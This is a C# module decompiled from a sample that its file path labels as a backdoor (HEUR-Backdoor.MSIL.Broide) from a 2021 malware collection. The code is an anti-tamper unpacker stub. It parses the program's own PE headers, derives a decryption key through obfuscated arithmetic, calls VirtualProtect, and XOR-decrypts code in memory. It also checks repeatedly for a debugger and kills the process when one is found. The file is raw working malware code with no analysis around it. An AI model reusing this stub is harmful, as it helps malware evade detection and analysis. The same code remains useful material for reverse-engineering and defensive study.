// Decompiled with JetBrains decompiler
// Type: -.<Module>
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using \u002D;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u002D
{
  internal class \u003CModule\u003E
  {
    [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
    internal static extern bool smethod_0([In] IntPtr obj0, [In] uint obj1, [In] uint obj2, [In] ref uint obj3);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    internal static extern bool smethod_1([In] IntPtr obj0, [In] ref bool obj1);

    internal static unsafe void smethod_2()
    {
      Module module = typeof (\u003CModule\u003E).Module;
      string fullyQualifiedName = module.FullyQualifiedName;
      bool flag1 = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
      byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
      byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
      ushort num1 = *(ushort*) (numPtr1 + 6);
      ushort num2 = *(ushort*) (numPtr1 + 20);
      bool flag2 = false;
      uint* numPtr2 = (uint*) null;
      uint num3 = 0;
      uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num2);
      uint num4 = 2649911927;
      uint num5 = 3977467997;
      uint num6 = 612069773;
      uint num7 = 4219776510;
      \u003CModule\u003E.smethod_1(Process.GetCurrentProcess().Handle, ref flag2);
      if (flag2)
        Environment.FailFast((string) null);
      for (int index1 = 0; index1 < (int) num1; ++index1)
      {
        uint* numPtr4 = numPtr3;
        uint* numPtr5 = (uint*) ((IntPtr) numPtr4 + 4);
        int num8 = (int) *numPtr4;
        uint* numPtr6 = numPtr5;
        uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
        int num9 = (int) *numPtr6;
        switch ((uint) (num8 * num9))
        {
          case 0:
            numPtr3 = numPtr7 + 8;
            continue;
          case 336167554:
            numPtr2 = (uint*) (hinstance + (flag1 ? numPtr7[3] : numPtr7[1]));
            \u003CModule\u003E.smethod_1(Process.GetCurrentProcess().Handle, ref flag2);
            if (flag2)
              Environment.FailFast((string) null);
            num3 = (flag1 ? numPtr7[2] : *numPtr7) >> 2;
            goto case 0;
          default:
            uint* numPtr8 = (uint*) (hinstance + (flag1 ? numPtr7[3] : numPtr7[1]));
            uint num10 = numPtr7[2] >> 2;
            for (uint index2 = 0; index2 < num10; ++index2)
            {
              int num11 = ((int) num4 ^ (int) *numPtr8++) + (int) num5 + (int) num6 * (int) num7;
              num4 = num5;
              num5 = num7;
              num7 = (uint) num11;
            }
            goto case 0;
        }
      }
      uint[] numArray1 = new uint[16];
      uint[] numArray2 = new uint[16];
      for (int index = 0; index < 16; ++index)
      {
        numArray1[index] = num7;
        numArray2[index] = num5;
        uint num12 = num5 >> 5 | num5 << 27;
        num5 = num6 >> 3 | num6 << 29;
        \u003CModule\u003E.smethod_1(Process.GetCurrentProcess().Handle, ref flag2);
        if (flag2)
          Environment.FailFast((string) null);
        num6 = num7 >> 7 | num7 << 25;
        num7 = num12 >> 11 | num12 << 21;
      }
      uint num13 = numArray1[13] * 4294967149U + numArray1[10] * 62U;
      uint num14 = numArray1[13] * 1578U;
      uint num15 = numArray1[13] * 4294966527U + numArray1[10] * 323U;
      uint num16 = numArray1[13] * 4294964476U;
      uint num17 = num14 + numArray1[10] * 4294966633U;
      numArray1[11] = (uint) ~((int) numArray1[11] ^ (int) numArray1[9]);
      numArray1[12] = numArray1[12] ^ numArray2[12];
      uint num18 = num13 + numArray1[3] * 4294967269U;
      uint num19 = num17 + numArray1[3] * 293U;
      numArray1[14] = numArray1[14] + 1165681824U;
      uint num20 = num16 + numArray1[10] * 1185U;
      uint num21 = num15 + numArray1[3] * 4294967153U;
      uint num22 = num18 + (numArray1[1] << 3);
      numArray1[9] = numArray1[9] ^ 698362112U;
      numArray1[13] = num22;
      uint num23 = numArray1[8] * 4294966829U;
      uint num24 = num20 + numArray1[3] * 4294966773U + numArray1[1] * 157U;
      numArray1[10] = num24;
      uint num25 = num23 + numArray1[4] * 4294967019U + numArray1[2] * 374U;
      numArray1[6] = numArray1[6] ^ numArray2[6];
      uint num26 = num19 + numArray1[1] * 4294967208U;
      uint num27 = numArray1[8] * 4294966661U;
      numArray1[3] = num26;
      uint num28 = numArray1[8] * 2026U;
      uint num29 = num21 + numArray1[1] * 43U;
      uint num30 = num25 + numArray1[7] * 4294967184U;
      numArray1[1] = num29;
      uint num31 = num28 + numArray1[4] * 1200U;
      uint num32 = numArray1[8] * 259U;
      numArray1[9] = numArray1[9] ^ numArray2[9];
      numArray1[13] = (uint) ~((int) numArray1[13] ^ (int) numArray1[11]);
      uint num33 = num27 + numArray1[4] * 4294966920U;
      numArray1[8] = num30;
      numArray1[0] = numArray1[0] * 1936415193U;
      uint num34 = num31 + numArray1[2] * 4294965675U;
      uint num35 = numArray1[1] << 22;
      numArray1[1] = numArray1[1] >> 10;
      numArray1[15] = numArray1[15] ^ 2665579491U;
      uint num36 = num33 + numArray1[2] * 508U;
      numArray1[10] = numArray1[10] ^ numArray2[10];
      uint num37 = num36 + numArray1[7] * 4294967144U;
      numArray1[1] = numArray1[1] | num35;
      numArray1[5] = (uint) ~((int) numArray1[5] ^ (int) numArray1[0]);
      numArray1[8] = numArray1[8] ^ numArray1[5];
      uint num38 = num32 + numArray1[4] * 153U + numArray1[2] * 4294967089U;
      numArray1[2] = num37;
      uint num39 = num34 + numArray1[7] * 485U;
      uint num40 = num38 + numArray1[7] * 62U;
      uint num41 = numArray1[9] & 2968719283U;
      numArray1[5] = numArray1[5] ^ numArray2[5];
      uint num42 = numArray1[3] >> 1;
      numArray1[9] = numArray1[9] & 1326248012U;
      numArray1[3] = numArray1[3] << 31;
      numArray1[14] = (uint) ~((int) numArray1[14] ^ -1332713739);
      numArray1[3] = numArray1[3] | num42;
      uint num43 = num41 * 2231258615U;
      numArray1[6] = numArray1[6] ^ numArray1[12];
      numArray1[7] = num40;
      numArray1[6] = numArray1[6] * 423395187U;
      numArray1[4] = num39;
      numArray1[9] = numArray1[9] | numArray1[6] & 2968719283U;
      numArray1[13] = numArray1[13] ^ numArray2[13];
      uint num44 = numArray1[12] * 377020151U;
      numArray1[7] = (uint) ~((int) numArray1[7] ^ (int) numArray1[14]);
      numArray1[6] = numArray1[6] & 1326248012U;
      numArray1[3] = numArray1[3] ^ numArray2[3];
      numArray1[6] = numArray1[6] | num43 * 4227105735U;
      numArray1[2] = (uint) ~((int) numArray1[2] ^ (int) numArray1[10]);
      numArray1[5] = (uint) ~((int) numArray1[5] ^ (int) numArray1[9]);
      numArray1[12] = numArray1[15];
      numArray1[15] = num44 * 1596539591U;
      uint num45 = numArray1[8] & 2437881261U;
      uint num46 = numArray1[13] * 881477481U;
      numArray1[13] = numArray1[1];
      uint num47 = num45 * 4233225123U;
      numArray1[1] = num46 * 1325840601U;
      numArray1[0] = (uint) ~((int) numArray1[0] ^ (int) numArray1[7]);
      numArray1[4] = numArray1[4] ^ numArray2[4];
      uint num48 = numArray1[13] << 2;
      numArray1[4] = numArray1[4] ^ 2544750443U;
      numArray1[8] = numArray1[8] & 1857086034U;
      uint num49 = numArray1[12] >> 1;
      numArray1[12] = numArray1[12] << 31;
      numArray1[8] = numArray1[8] | numArray1[10] & 2437881261U;
      numArray1[12] = numArray1[12] | num49;
      numArray1[2] = (uint) ~((int) numArray1[2] ^ (int) numArray1[0]);
      numArray1[10] = numArray1[10] & 1857086034U;
      numArray1[4] = numArray1[4] * 591002433U;
      uint num50 = numArray1[12] & 1586172085U;
      uint num51 = numArray1[4] * 41U;
      numArray1[7] = numArray1[7] ^ 2371575995U;
      numArray1[0] = numArray1[0] ^ numArray2[0];
      numArray1[10] = numArray1[10] | num47 * 873162763U;
      uint num52 = numArray1[11] << 25;
      numArray1[11] = numArray1[11] >> 7;
      numArray1[11] = numArray1[11] | num52;
      uint num53 = numArray1[3] & 3958412586U;
      numArray1[13] = numArray1[13] >> 30;
      numArray1[1] = numArray1[1] ^ numArray2[1];
      uint num54 = num53 * 26635029U;
      numArray1[3] = numArray1[3] & 336554709U;
      numArray1[12] = numArray1[12] & 2708795210U;
      numArray1[13] = numArray1[13] | num48;
      numArray1[3] = numArray1[3] | numArray1[14] & 3958412586U;
      numArray1[14] = numArray1[14] & 336554709U;
      numArray1[14] = numArray1[14] | num54 * 3161820221U;
      uint num55 = numArray1[2] << 4;
      uint num56 = numArray1[7] >> 1;
      numArray1[2] = numArray1[2] >> 28;
      uint num57 = num50 * 3673986311U;
      numArray1[12] = numArray1[12] | numArray1[1] & 1586172085U;
      uint num58 = num51 + numArray1[6] * 4294967266U;
      numArray1[2] = numArray1[2] | num55;
      numArray1[1] = numArray1[1] & 2708795210U;
      numArray1[7] = numArray1[7] << 31;
      numArray1[11] = numArray1[11] ^ numArray2[11];
      numArray1[1] = numArray1[1] | num57 * 3118254263U;
      uint num59 = numArray1[4] * 53U;
      numArray1[7] = numArray1[7] | num56;
      uint num60 = numArray1[4] * 4294967241U;
      uint num61 = num59 + numArray1[6] * 4294967251U;
      numArray1[15] = numArray1[15] + 2983003123U;
      uint num62 = (uint) (0 + (int) numArray1[6] * -2);
      uint num63 = num60 + numArray1[6] * 42U;
      uint num64 = num61 + numArray1[10] * 23U;
      uint num65 = num63 + numArray1[10] * 4294967271U;
      uint num66 = num62 + numArray1[10] * uint.MaxValue;
      uint num67 = num64 + numArray1[5] * 4294967292U;
      uint num68 = num66 + numArray1[5];
      uint num69 = num58 + numArray1[10] * 19U;
      uint num70 = num65 + (numArray1[5] << 1);
      uint num71 = num69 + numArray1[5] * 4294967291U;
      numArray1[4] = num68;
      uint num72 = num70 + (numArray1[5] << 2);
      numArray1[9] = numArray1[9] ^ numArray1[8];
      uint num73 = numArray1[15] << 1;
      numArray1[6] = num67;
      uint num74 = numArray1[15] * 4294967292U;
      numArray1[10] = num72;
      numArray1[5] = num71;
      uint num75 = num74 + numArray1[3] * 4294967289U;
      uint num76 = num73 + (numArray1[15] << 2);
      uint num77 = numArray1[15] * 4294967286U;
      uint num78 = (numArray1[15] << 2) + numArray1[15] + (numArray1[3] << 2);
      uint num79 = num76 + (numArray1[3] << 3);
      uint num80 = num75 + (numArray1[0] << 1);
      uint num81 = num77 + numArray1[3] * 4294967283U;
      numArray1[14] = numArray1[14] ^ numArray2[14];
      uint num82 = num80 + (numArray1[0] << 2);
      uint num83 = num78 + numArray1[0] * 4294967288U;
      uint num84 = num81 + numArray1[0] * 11U;
      uint num85 = num82 + (numArray1[11] << 1);
      uint num86 = num79 + numArray1[3];
      uint num87 = num84 + (numArray1[11] << 2);
      uint num88 = num83 + numArray1[11];
      numArray1[2] = numArray1[2] ^ numArray2[2];
      uint num89 = num86 + numArray1[0] * 4294967289U;
      numArray1[0] = num87;
      numArray1[10] = numArray1[10] ^ 2575602088U;
      numArray1[14] = (uint) ~((int) numArray1[14] ^ 734475083);
      uint num90 = numArray1[13] & 2025241071U;
      numArray1[15] = num88;
      uint num91 = num89 + numArray1[11] * 4294967293U;
      numArray1[3] = num85;
      numArray1[11] = num91;
      numArray1[13] = numArray1[13] & 2269726224U;
      uint num92 = num90 * 3561469737U;
      numArray1[7] = numArray1[7] ^ numArray2[7];
      numArray1[13] = numArray1[13] | numArray1[7] & 2025241071U;
      numArray1[8] = numArray1[8] ^ numArray2[8];
      numArray1[15] = numArray1[15] ^ numArray2[15];
      numArray1[7] = numArray1[7] & 2269726224U;
      numArray1[7] = numArray1[7] | num92 * 571135257U;
      uint num93 = 64;
      \u003CModule\u003E.smethod_0((IntPtr) (void*) numPtr2, num3 << 2, 64U, ref num93);
      if (num93 == 64U)
        return;
      uint num94 = 0;
      for (uint index = 0; index < num3; ++index)
      {
        uint* numPtr9 = numPtr2;
        int num95 = (int) *numPtr9 ^ (int) numArray1[(int) num94 & 15];
        *numPtr9 = (uint) num95;
        numArray1[(int) num94 & 15] = (uint) (((int) numArray1[(int) num94 & 15] ^ (int) *numPtr2++) + 1035675673);
        \u003CModule\u003E.smethod_1(Process.GetCurrentProcess().Handle, ref flag2);
        if (flag2)
          Environment.FailFast((string) null);
        ++num94;
      }
    }
  }
}
